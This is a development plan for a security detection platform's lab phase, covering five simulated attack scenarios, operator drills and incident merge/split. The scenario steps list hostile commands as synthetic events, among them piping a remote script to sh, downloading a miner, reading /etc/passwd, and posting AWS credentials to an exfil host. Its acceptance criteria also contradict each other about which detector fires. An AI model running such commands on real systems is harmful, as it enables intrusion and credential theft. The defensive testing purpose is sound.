# Phase 20 — Heavy-Hitter Scenarios, Operator Drills, Merge/Split Plan

## Context

Phase 19 (hardening + CI/CD + detection-as-code, `v0.9` 2026-05-02) and Phase 19.5 (chaos testing fully verified locally 2026-05-04) closed the platform's resilience story. Phase 20 is the **first phase since 18 to add product surface** — five named choreographed attack scenarios, an operator-drill mode for guided practice runs, and the analyst affordance of merging and splitting incidents.

**Why now.** PROJECT_STATE.md scoped these five scenarios months ago; `credential_theft_chain` (Phase 8) is currently the only fully-scripted attack story. Phase 21 (Caldera adversary emulation + coverage scorecard) needs a baseline of *what we already know we catch* before Caldera shows us what we don't — Phase 20 produces that baseline, plus the operator surface that converts the platform from "ships incidents" to "trains analysts."

**Guardrails (non-negotiable).** No new detectors (per `docs/phase-19-plan.md` line 268 + the LotL/UEBA thesis — every detector added before Caldera coverage data is a guess). No telemetry source changes. No event-kind expansion beyond `KNOWN_KINDS` (`backend/app/ingest/normalizer.py:5-16`). Where a scenario's correlation chain doesn't fire end-to-end with current detectors, the gap is *recorded as a Phase 21 input* in `docs/phase-20-summary.md`, not patched here.

This plan models on `docs/phase-19.5-plan.md`'s structure — terse, code-cited, per-workstream Files/Mechanism/Acceptance sub-headers; the only table is Risks. Three workstreams: A (scenarios A1–A5), B (drills), C (merge/split); D collects smoke + docs + closeout.

**Branch + PR shape.** `phase-20-heavy-hitter-scenarios` feature branch, three internal PRs on the same branch (20.1 scenarios, 20.2 drills, 20.3 merge/split + docs), `v1.0` tag at the close-out merge.

## Calibration vs the roadmap

One scope clarification, no recipe revisions:

- **Ransomware scenario stops at staging.** Per CLAUDE.md §8 (host safety) the scenario emits enumerate / archive / mass-rename / delete-originals events, but does NOT actually encrypt files on any host or container. The "file-creation burst" event sequence is the detection signal regardless.
- **All five scenarios use Linux primitives** (sshd, bash, curl, ssh, tar) so they run identically against `lab-debian` and any future Linux lab container. Windows-flavored techniques (`vssadmin`, `powershell -enc`) are out of scope — the existing `credential_theft_chain` already exercises encoded-PowerShell handling and Phase 22 LotL work will extend it.

## Workstream A — Five choreographed scenarios

Every scenario lives at `labs/simulator/scenarios/<name>.py`, follows the `credential_theft_chain.py:38-160` shape (constants block + `_log()` + `wait()` helper + `async run(client, speed)` returning a results dict), and is registered in `labs/simulator/scenarios/__init__.py:7-9`. Each scenario emits only `KNOWN_KINDS` and ships a JSONL fixture at `labs/fixtures/scenario/<name>.jsonl` plus a `labs/fixtures/manifest.yaml` entry declaring `must_fire` / `must_not_fire` against the existing detector roster (Phase 19 detection-as-code pattern).

### A1 — `lateral_movement_chain`

**Files:** `labs/simulator/scenarios/lateral_movement_chain.py`; `labs/fixtures/scenario/lateral_movement_chain.jsonl`.

**Mechanism (compressed via `--speed 0.1`):**
1. `auth.failed` × 5 — alice@host-1 from src=203.0.113.42 (60s window).
2. `auth.succeeded` — alice@host-1 from same anomalous src.
3. `session.started` — alice@host-1.
4. `process.created` host-1 — sshd→bash→`ssh alice@host-2`.
5. `auth.succeeded` — alice@host-2 from host-1.
6. `process.created` host-2 — sshd→bash→`curl http://203.0.113.42/persist | sh`.
7. `process.created` host-2 — sshd→bash→`ssh alice@host-3`.
8. `auth.succeeded` — alice@host-3 from host-2.

**Acceptance (must_fire):** `py.auth.failed_burst`, `py.auth.anomalous_source_success`. **must_not_fire:** `py.process.suspicious_child` (see "Likely gap" below). **Correlators:** `identity_compromise` (alice). The `identity_endpoint_chain` and `endpoint_compromise_join` correlators are downstream-blocked by the missing endpoint signal — A1 produces a single `identity_compromise` incident in current platform state.

**Expected ATT&CK on resulting incident:** T1110, T1078. (T1021.004, T1059.004, T1105 are present in the event evidence but won't be tag-attached because no detector matches them in current platform state — Phase 22 LotL input.)

**Likely gap (record, do not fix — corrected from earlier draft):** `process_suspicious_child` (`backend/app/detection/rules/process_suspicious_child.py:14-25`) has three branches — encoded PowerShell, Office→shell, rundll32+script — all Windows-flavored. There is **no** Linux `sshd→bash→ssh` branch. A1's stages 4–7 will not fire any endpoint detector, so the cross-layer chain (`identity_endpoint_chain`, `endpoint_compromise_join`) cannot form. This is a Phase 22 LotL detector candidate, not a Phase 20 fix. The earlier "second-hop won't extend" concern is moot — there's no incident to extend in the first place.

**Reused from prior phases:** `SimulatorClient.post_event()` (Phase 8); `auth_failed`/`auth_succeeded`/`process_created` templates (Phase 8 — `labs/simulator/event_templates.py:16-126`); `extend_incident()` (`backend/app/correlation/extend.py:22-92`, Phase 11).

### A2 — `crypto_mining_payload`

**Files:** `labs/simulator/scenarios/crypto_mining_payload.py`; `labs/fixtures/scenario/crypto_mining_payload.jsonl`.

**Pre-flight (Stage 0 of the scenario):** seed `198.51.100.77` into blocked observables via `client.block_observable(value="198.51.100.77", kind="ip", reason="phase-20 crypto_mining_payload pool IP")`. Cleaned up in Stage N.

**Mechanism:**
1. `process.created` host-mine — sshd→bash→`curl https://attacker.example.com/xmrig -o /tmp/xmrig`.
2. `file.created` — `/tmp/xmrig`.
3. `process.created` — sshd→bash→`chmod +x /tmp/xmrig`.
4. `process.created` — sshd→bash→`/tmp/xmrig --pool stratum+tcp://198.51.100.77:4444 -u <wallet>`.
5. `network.connection` — host-mine → 198.51.100.77:4444.

**Acceptance (must_fire):** `py.process.suspicious_child` (curl|sh chain), `py.blocked_observable_match` (pool IP). **Correlator:** `endpoint_compromise_standalone` (host-mine, hour-bucket dedupe).

**Expected ATT&CK:** T1105, T1496, T1071.001.

**Reused:** `block_observable` ingest path (Phase 16.10); `safe_redis()`-backed dedup (`backend/app/db/redis_state.py`, Phase 19 §A1).

### A3 — `webshell_drop`

**Files:** `labs/simulator/scenarios/webshell_drop.py`; `labs/fixtures/scenario/webshell_drop.jsonl`.

**Mechanism:**
1. `network.connection` host-web inbound — src=203.0.113.42 → :80.
2. `file.created` host-web — `/var/www/html/upload.php` (owner=www-data).
3. `process.created` host-web — apache2→sh→`id`.
4. `process.created` host-web — apache2→sh→`cat /etc/passwd`.
5. `process.created` host-web — apache2→sh→`wget http://203.0.113.42/recon -O /tmp/recon`.

**Acceptance (must_fire):** `[]` (none — see "Confirmed gap"). **must_not_fire:** all four current detectors. **Correlator:** none in current platform state; Phase 22 LotL detector for apache2→sh chains would promote A3 to `endpoint_compromise_standalone`.

**Confirmed gap (corrected from earlier draft — same root cause as §A1):** `process_suspicious_child` (`backend/app/detection/rules/process_suspicious_child.py:14-25`) has three branches — encoded PowerShell, Office→shell, rundll32+script — all Windows-only. The earlier draft claimed it was "calibrated for sshd→bash chains" which is also wrong (no Linux branch exists at all). `apache2→sh` doesn't match. No auth events; no pre-blocked observables. A3 produces no incident. The recurring "no Linux process-chain detector" gap (now confirmed in A1+A2+A3) is the strongest single Phase 22 input. **Per the no-new-detectors guardrail, do NOT extend the rule in Phase 20.**

**Expected ATT&CK:** T1505.003, T1059.004, T1083.

**Reused:** `process_created`/`file_created`/`network_connection` templates (Phase 8 + Phase 16.9 + Phase 16.10).

### A4 — `ransomware_staging`

**Files:** `labs/simulator/scenarios/ransomware_staging.py`; `labs/fixtures/scenario/ransomware_staging.jsonl`.

**Mechanism (Linux-flavored; staging only, not detonation):**
1. `process.created` host-rw — sshd→bash→`find /home -name "*.pdf" -o -name "*.docx"`.
2. `process.created` — sshd→bash→`tar czf /tmp/loot.tar.gz /home/alice/Documents`.
3. `file.created` × 30 — `/home/alice/Documents/<orig>.encrypted` over a 60s window (synthetic — no real files written).
4. `process.created` — sshd→bash→`rm -rf /home/alice/Documents/*`.

**Acceptance:** `py.process.suspicious_child` fires on the bash chain. **Correlator:** `endpoint_compromise_standalone` (host-rw).

**Likely gap (record, do not fix):** a "file-creation burst" detector would fire on stage 3 but does not exist. This is exactly the kind of detector Phase 22 will add — the gap is the deliverable, not a Phase 20 detector.

**Expected ATT&CK:** T1486, T1490, T1083, T1005.

**Reused:** same template set as A3.

### A5 — `cloud_token_theft_lite`

**Files:** `labs/simulator/scenarios/cloud_token_theft_lite.py`; `labs/fixtures/scenario/cloud_token_theft_lite.jsonl`.

**Pre-flight (Stage 0):** seed `198.51.100.88` (attacker exfil host) into blocked observables.

**Mechanism:**
1. `process.created` host-1 — sshd→bash→`cat /home/alice/.aws/credentials`.
2. `process.created` host-1 — sshd→bash→`curl -X POST https://198.51.100.88/exfil -d @/home/alice/.aws/credentials`.
3. `network.connection` host-1 → 198.51.100.88:443.
4. `auth.succeeded` host-cloud — alice from cloud-NAT-IP (synthetic; first time alice has logged in from this src).

**Acceptance (must_fire):** `py.process.suspicious_child` (cat|curl chain), `py.blocked_observable_match` (exfil IP), `py.auth.anomalous_source_success` (final cloud login). **Correlators:** `endpoint_compromise_standalone` (host-1), `identity_compromise` (alice on host-cloud), `identity_endpoint_chain` (cross-layer alice).

**Expected ATT&CK:** T1552.001, T1567, T1078.004.

**Reused:** all of A1's identity-side primitives + A2's blocked-observable seed.

### A6 — Files & Acceptance roll-up

**Files added (new):**
- 5 × `labs/simulator/scenarios/<name>.py`.
- 5 × `labs/fixtures/scenario/<name>.jsonl`.
- `backend/tests/integration/test_phase20_scenarios.py` — drives `replay.py` against each fixture, asserts incident kind + entity attachments.

**Files modified:**
- `labs/simulator/scenarios/__init__.py` — register 5 new scenarios.
- `labs/simulator/event_templates.py` — extend with a `file_created()` template if not already present; verify apache→sh shape support for A3.
- `labs/fixtures/manifest.yaml` — append 5 entries with `must_fire` / `must_not_fire` lists.

**Acceptance:**
- `python -m labs.simulator --scenario <name> --speed 0.1` runs each scenario to completion with no exceptions.
- `python labs/fixtures/replay.py --manifest labs/fixtures/manifest.yaml` is green for the existing manifest entries AND the 5 new ones.
- `pytest backend/tests/integration/test_phase20_scenarios.py` passes.

## Workstream B — Operator drills

**Concept.** A drill is a guided run of a scenario that pauses at decision points and prints what the operator should look at. CLI-driven; the frontend sees a normal incident.

### B1 — Orchestrator + drill scripts

**Files:**
- `labs/drills/run.sh` — orchestrator. Sources `labs/chaos/lib/evaluate.sh` for token reader + log helpers (Phase 19.5 reuse).
- 5 × `labs/drills/<name>.md` — markdown drills, one per scenario.

**Mechanism:** the orchestrator (a) wipes existing demo state via `DELETE /v1/admin/demo-data`, (b) runs the scenario at `--speed 0.1`, (c) polls `GET /v1/incidents?opened_after=...` until the expected incident kind appears, (d) prints the incident URL, (e) pauses with a "Press Enter when you've completed step N" prompt at each decision point, (f) verifies the operator's response (e.g., did they transition the incident to `contained`? did they propose a block-IP action?) by querying the API, (g) prints a debrief at the end.

**Markdown shape (every drill):**

```markdown
# Drill — <scenario name>

## Briefing
<1 paragraph: what's about to happen, what the operator should expect to see>

## Run
bash labs/drills/run.sh <name> --speed 0.1

## Decision points
1. **Identify the pivot entity.** ...
   - Expected: transition to `triaged` with a note naming the entity.
2. **Propose a containment action.** ...
   - Expected: operator proposes `block_ip_lab`.
...

## Expected outcome
- Incident kind: <kind>
- Final status: contained
- One <action> proposed (and ideally executed)
```

**Acceptance:**
- `bash labs/drills/run.sh <name> --speed 0.1 --no-pause` runs each drill end-to-end without hanging.
- Operator manually walks through all 5 drills at least once with pauses enabled; each markdown leads to the expected incident state.

**Scope discipline.** No frontend changes. CLI-only. A future "Drill mode" UI banner is explicitly Phase 24+ scope. No new training-mode flag in the database.

**Reused from prior phases:** `DELETE /v1/admin/demo-data` (Phase 17 first-run wipe); `labs/chaos/lib/evaluate.sh` token reader (Phase 19.5); existing `propose_action` / transition routes (Phase 11/14/15).

## Workstream C — Merge / split incidents

This is the largest piece — schema + correlator + API + frontend. ADR-0015 is the durable decision artifact.

### C1 — Schema (migration 0009)

**File:** `backend/alembic/versions/0009_incident_merge_split.py`.

**Mechanism:**
- `ALTER TABLE incidents ADD COLUMN parent_incident_id UUID NULLABLE` + FK back to `incidents.id` + index `ix_incidents_parent_incident_id`.
- `ALTER TYPE incident_status ADD VALUE IF NOT EXISTS 'merged'` (Postgres ≥ 9.6 syntax; we target 14+).
- Downgrade is asymmetric: drops the FK + column, but **does not remove `'merged'` from the enum** (Postgres limitation — values cannot be removed cleanly without rebuilding all dependent rows). Documented in the migration docstring and ADR-0015.

**Why nullable parent FK over a junction table.** An incident can be merged into exactly one parent at a time; if it's later un-merged, we close one chapter and open a new incident — the `IncidentTransition` log preserves history. A junction table would only matter for n-way merges, which are out of scope.

**Reused:** Alembic + Async SQLAlchemy migration pattern from `backend/alembic/versions/0008_add_incident_summary.py` (Phase 18).

### C2 — Correlator-layer enforcement

**Files:**
- `backend/app/correlation/merge.py` (new): `async merge_incidents(db, *, source_id, target_id, reason, actor) -> Incident`.
- `backend/app/correlation/split.py` (new): `async split_incident(db, *, source_id, event_ids, entity_ids, reason, actor) -> Incident`.

**Mechanism (merge):**
1. Postgres advisory lock keyed on the deterministic `(min(src,tgt), max(src,tgt))` pair — `SELECT pg_advisory_xact_lock(:k)`. Prevents two simultaneous merges from racing on the same incident pair.
2. `SELECT ... FOR UPDATE` on both rows.
3. Validate: source != target; source.status != 'merged'; target.status not in {'closed', 'merged'}.
4. `extend_incident(target, source.events, source.entities, source.detections, source.attack_tags)` — idempotent via `ON CONFLICT DO NOTHING` (already used by `endpoint_compromise_join`).
5. `target.severity = max(source.severity, target.severity)`; `target.confidence = (source.confidence + target.confidence) / 2`.
6. `source.status = 'merged'`; `source.parent_incident_id = target.id`.
7. Two `IncidentTransition` rows (audit log).
8. Publish `incident.merged` SSE event for both incident IDs.
9. Commit.

**Mechanism (split):**
1. Advisory lock on source (child is brand-new, no race).
2. Validate: at least one event_id or entity_id; all IDs belong to source; source.status not in {'closed', 'merged'}.
3. Create child `Incident` — `kind` copied from source, `status='new'`, `dedupe_key=NULL` (split children are non-canonical), `correlator_rule='split'`.
4. Move `IncidentEvent` / `IncidentEntity` / `IncidentDetection` rows from source → child for the requested IDs.
5. Recompute source aggregates (severity/confidence) on remaining evidence.
6. Two `IncidentTransition` rows (audit log).
7. Publish `incident.split` SSE event for both incident IDs.
8. Commit.

**Why split does NOT set `parent_incident_id`.** Splitting is "this evidence belongs to a different incident now," not the inverse of merge. The audit link is the `IncidentTransition` row. Documented in ADR-0015.

**Reused:** `extend_incident()` (`backend/app/correlation/extend.py:22-92`, Phase 11); SSE bus publish helper (`backend/app/streaming/bus.py`, Phase 13); state-machine transition pattern (`backend/app/api/routers/incidents.py:52-60`, Phase 11).

### C3 — API surface

**File:** `backend/app/api/routers/incidents.py` (extend); `backend/app/api/schemas/incidents.py` (extend or create).

**New routes:**
- `POST /v1/incidents/{id}/merge-into` body `{target_id: UUID, reason: str (1..500)}` → 200 with updated target detail.
- `POST /v1/incidents/{id}/split` body `{event_ids: [UUID], entity_ids: [UUID], reason: str (1..500)}` → 201 with new child detail.

**Permission boundary:** both routes require `Depends(require_user)` AND `actor.role in {"analyst", "lead"}` — viewer-tier accounts cannot mutate evidence (Phase 14 multi-operator auth provides `User.role`). 403 on viewer attempt.

**Error mapping:**
- Self-merge → 422.
- Merge into closed/merged target → 409.
- Re-merge of already-merged source → 409.
- Split with empty `event_ids` AND empty `entity_ids` → 422.
- Split off events not belonging to source → 422.

**Reused:** existing role-check pattern (`require_user` dep, `User.role` field, Phase 14); existing error-mapping conventions (per `backend/app/api/routers/incidents.py:395-469`).

### C4 — Frontend

**Pre-flight (hard rule):** invoke `Skill(skill="frontend-design:frontend-design")` BEFORE writing or rewriting any merge/split UI components, per `feedback_frontend_design_skill.md`. The dossier-token aesthetic (`bg-dossier-stamp`, `border-dossier-paperEdge`, `text-dossier-ink`) MUST hold — no `bg-zinc-*` fallbacks.

**New components:**
- `frontend/app/incidents/[id]/components/MergeModal.tsx` — opens from a "Merge into…" header button; uses an existing `GET /v1/incidents?q=` typeahead (verify during implementation; build a minimal one if absent); shows side-by-side diff of "before/after merge" event/entity counts; requires `reason`; on confirm POSTs and redirects to target.
- `frontend/app/incidents/[id]/components/SplitButton.tsx` — toggles a "split mode" on the timeline panel (checkbox per event row in `IncidentTimelineViz.tsx`); submitting POSTs and redirects to child.

**Modified components:**
- `frontend/app/incidents/[id]/page.tsx` — header buttons + "Merged into <link>" / "Split from <link>" banners.
- `frontend/app/incidents/[id]/components/IncidentTimelineViz.tsx` — accept `splitMode: boolean` prop, render checkboxes when active.
- OpenAPI client regen after backend ships.

**Frontend rebuild reminder** (per `feedback_frontend_rebuild.md`): the frontend image is baked, not bind-mounted. After any `frontend/` source change, `docker compose build frontend && docker compose up -d frontend`.

### C5 — ADR-0015

**File:** `docs/decisions/ADR-0015-incident-merge-split.md`.

**Decision:** nullable `parent_incident_id` FK on `incidents` + new `'merged'` value in `incident_status` enum + `IncidentTransition` rows as the audit log. Split children are non-canonical (`dedupe_key=NULL`) and do NOT set `parent_incident_id`.

**Alternatives rejected:** (a) junction table `incident_merges` (only useful for n-way merges); (b) soft-delete-and-recreate (loses event/entity attachment continuity); (c) event-sourced rebuild (massive complexity for one feature).

**Consequences:** downgrade of migration 0009 cannot remove `'merged'` from the enum (Postgres limitation, documented); operator-triggered only (no auto-merge — auto-merge is Phase 24+, blocked by the no-ML rule); split-of-merged-incident rejected at API layer.

### C6 — Tests

**Files:** `backend/tests/integration/test_incident_merge.py`, `backend/tests/integration/test_incident_split.py`.

**Merge test cases:**
1. Two open incidents → target has all events/entities/detections from both, source.status='merged', source.parent_incident_id=target.id, two `IncidentTransition` rows.
2. Self-merge → 422.
3. Merge into closed target → 409.
4. Re-merge of already-merged source → 409.
5. Concurrent merge attempt on the same source (two sessions) → second blocks on advisory lock then errors.
6. Viewer-tier user → 403.

**Split test cases:**
1. Split N events from incident with M total → child has N, source has M-N, both have transition rows.
2. Empty event_ids AND empty entity_ids → 422.
3. Events not belonging to source → 422.
4. Split of merged incident → 422.
5. Recompute correctness: source.severity/confidence reflect remaining evidence.
6. Viewer-tier user → 403.

## Workstream D — Smoke + docs + closeout

### D1 — Smoke test

**File:** `labs/smoke_test_phase20.sh`.

**Mechanism:** sources `labs/chaos/lib/evaluate.sh`; `cleanup` trap calls `DELETE /v1/admin/demo-data`. Loops over the five scenarios asserting expected incident kind appears. Then runs two scenarios on overlapping users + merges them, asserts source.status='merged' and parent FK populated. Then runs one scenario + splits 3 events to a child, asserts child has 3 events.

**Acceptance:** script exits 0 with `OK: phase 20 smoke green` on a clean stack.

**Reused:** `assert_incident_kind_present`, `latest_incident_id_for`, token reader from `labs/chaos/lib/evaluate.sh` (Phase 19.5).

### D2 — Documentation

**Modified:**
- `docs/runbook.md` — three new sections after the Chaos workflows block (~line 711): *Running Phase 20 scenarios*, *Operator drills*, *Merging and splitting incidents* (curl examples + role reminder).
- `docs/learning-notes.md` — append entries for: Cyber Kill Chain & ATT&CK matrix; Living off the Land (LotL) preview; Webshell mechanics; Ransomware staging vs detonation; Cloud credential exfiltration; Postgres advisory locks; Postgres enum mutability; Incident merge/split semantics; Operator drill mode; Scenario choreography.
- `CyberCat-Explained.md` §15 — bullet 25 for Phase 20.
- `Project Brief.md` — postscript: "Phase 20 added five named choreographed scenarios, operator drills, and incident merge/split. The platform now trains analysts as well as detects."
- `PROJECT_STATE.md` — top header + new Phase-by-phase entry.

**New (at close-out):**
- `docs/phase-20-summary.md` — plain-language story; **must** include a "Detection gaps" section listing every scenario step that did NOT fire a detector (the input list for Phase 21).

### D3 — Tag

`v1.0` cut at the merge commit of the final Phase 20 PR.

## Files — full new/modified roll-up

**New (Workstream A):**
- `labs/simulator/scenarios/lateral_movement_chain.py`
- `labs/simulator/scenarios/crypto_mining_payload.py`
- `labs/simulator/scenarios/webshell_drop.py`
- `labs/simulator/scenarios/ransomware_staging.py`
- `labs/simulator/scenarios/cloud_token_theft_lite.py`
- `labs/fixtures/scenario/<name>.jsonl` × 5
- `backend/tests/integration/test_phase20_scenarios.py`

**New (Workstream B):**
- `labs/drills/run.sh`
- `labs/drills/<name>.md` × 5

**New (Workstream C):**
- `backend/alembic/versions/0009_incident_merge_split.py`
- `backend/app/correlation/merge.py`
- `backend/app/correlation/split.py`
- `backend/tests/integration/test_incident_merge.py`
- `backend/tests/integration/test_incident_split.py`
- `frontend/app/incidents/[id]/components/MergeModal.tsx`
- `frontend/app/incidents/[id]/components/SplitButton.tsx`
- `docs/decisions/ADR-0015-incident-merge-split.md`

**New (Workstream D):**
- `labs/smoke_test_phase20.sh`
- `docs/phase-20-summary.md`

**Modified:**
- `labs/simulator/scenarios/__init__.py`
- `labs/simulator/event_templates.py`
- `labs/fixtures/manifest.yaml`
- `backend/app/db/models.py` (Incident.parent_incident_id + status enum)
- `backend/app/api/routers/incidents.py` (two routes)
- `backend/app/api/schemas/incidents.py` (request/response models)
- `frontend/app/incidents/[id]/page.tsx`
- `frontend/app/incidents/[id]/components/IncidentTimelineViz.tsx`
- `docs/runbook.md`
- `docs/learning-notes.md`
- `CyberCat-Explained.md`
- `Project Brief.md`
- `PROJECT_STATE.md`

## Out of scope

- New detectors (deferred to Phase 21/22 per guardrail).
- Auto-merge / similarity-based incident clustering (Phase 24+; blocked by no-ML rule).
- Frontend "drill mode" banner / training-state UI (CLI-only drills in Phase 20).
- Multi-tenant incident permissions (Phase 14 single-tenant model holds).
- Ransomware *detonation* — only *staging* signals (CLAUDE.md §8 host safety).
- N-way merges (only 2-way merge in scope).
- Cross-`kind` "smart" re-kinding on merge — target keeps its `kind`; the IncidentTransition row records the cross-kind absorption.
- Auto-split based on entity heuristics — operator-selected splits only.

## Verification plan

1. **Backend pytest green.** All existing 236+ tests still pass; new `test_phase20_scenarios.py`, `test_incident_merge.py`, `test_incident_split.py` all pass.
2. **Detection-as-code green.** `python labs/fixtures/replay.py --manifest labs/fixtures/manifest.yaml` reports zero diffs across the existing manifest + 5 Phase 20 entries.
3. **Smoke green.** `bash labs/smoke_test_phase20.sh` — five scenarios + merge + split assertions pass on a clean stack.
4. **Drill rehearsal.** Operator runs each of the five drills end-to-end at least once with pauses enabled; each drill leads to the expected final incident state.
5. **Frontend typecheck + build green.** `cd frontend && npm run typecheck && npm run build` — zero errors.
6. **Browser-verified merge/split.** Operator confirms in the UI that merge modal opens, search-by-id finds incidents, merge succeeds, "Merged into" banner appears; split mode toggles checkboxes, split button creates child, "Split from" breadcrumb appears; dossier tokens applied throughout.
7. **Existing chaos suite green.** `bash labs/chaos/run_chaos.sh` — Phase 19.5 chaos is unaffected by the merge/split schema change.
8. **CI green.** Both `ci.yml` and `smoke.yml` workflows pass on the PR.
9. **Detection gaps recorded.** `docs/phase-20-summary.md` "Detection gaps" section lists every scenario step that did NOT fire a detector — the Phase 21 input list.
10. **`v1.0` tag** cut at the Phase 20 close-out commit.

## Risks & mitigations

| # | Risk | Impact | Mitigation |
|---|---|---|---|
| 1 | `py.process.suspicious_child` doesn't match `apache → sh` (A3 webshell) | Webshell scenario produces no endpoint incident | Document the gap in `docs/phase-20-summary.md`; do NOT extend the detector. Preserves the no-new-detectors guardrail. |
| 2 | Migration 0009 collides with a parallel branch | Schema drift | Single PR + single Alembic version per PR; rebase before merge. |
| 3 | Merge race condition (two operators click merge on same source) | Second one wedges or duplicates evidence | Postgres advisory lock per `(min_id, max_id)` pair in `merge.py`. |
| 4 | `ALTER TYPE incident_status ADD VALUE` not supported on older Postgres | Migration fails | Target Postgres 14+ (current compose pin); document the floor in the migration. |
| 5 | Split orphans `dedupe_key` semantics | Re-correlation could create a duplicate of a split-off scenario | Splits leave source's dedupe_key in place; child has `dedupe_key=NULL` and is non-canonical. Documented in ADR-0015. |
| 6 | Frontend skips `frontend-design` skill again | UI drifts from dossier aesthetic | Hard rule in this plan: invoke skill before any new component. Tracked in `feedback_frontend_design_skill.md`. |
| 7 | Drill scripts go stale after scenario refactors | Drill leads operator to wrong place in UI | Smoke exercises each drill non-interactively; drift surfaces as smoke failure. |
| 8 | Scope creep into auto-merge | Sprint blow-out | Auto-merge explicitly out of scope (Phase 24+, no-ML rule). |
| 9 | One scenario produces no incident at all (existing detectors blind to chain) | A1–A5 acceptance fails | Acceptance is structured around realism, not "must produce an incident." Smoke only asserts on scenarios where the chain is expected to fire (A1, A2, A5 with high confidence; A3, A4 flagged gap-likely). |
| 10 | Frontend rebuild gotcha (image baked, not bind-mounted) | Operator sees stale UI after edits | Per `feedback_frontend_rebuild.md`: rebuild + up after `frontend/` changes. |

## Done-criteria

All ten verification-plan items green; three Phase 20 PRs merged to `main`; `docs/phase-20-summary.md` written with Detection-gap section; `CyberCat-Explained.md` §15 has Phase 20 bullet; ADR-0015 written; `v1.0` tag cut at the close-out commit.

## What this unblocks

- **Phase 21** (Caldera adversary emulation + coverage scorecard) — now has a baseline of what the platform catches without any speculative detector additions. The Phase 20 detection-gap list becomes a Phase 21 input.
- **Phase 22** (LotL behavior-chain detection) — the file-creation-burst gap (A4) and the apache→sh gap (A3) are concrete, evidenced detector candidates rather than speculation.
- **Operator hiring/demo story** — drill mode + merge/split shift the project from "polished detection demo" to "tested SOC platform with analyst training surface and standard analyst affordances."
